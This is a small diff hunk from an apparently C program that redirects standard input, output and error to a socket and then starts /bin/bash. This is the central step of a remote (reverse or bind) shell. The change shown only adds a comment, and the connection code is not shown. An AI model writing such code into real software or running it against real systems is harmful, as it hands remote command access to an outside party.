@@ -57,6 +57,7 @@ int main(int argc, char *argv[]) {
     dup2(sock, 0);
     dup2(sock, 1);
     dup2(sock, 2);
+    // start a shell
     execlp("/bin/bash", "/bin/bash", NULL);
 
     close(sock);
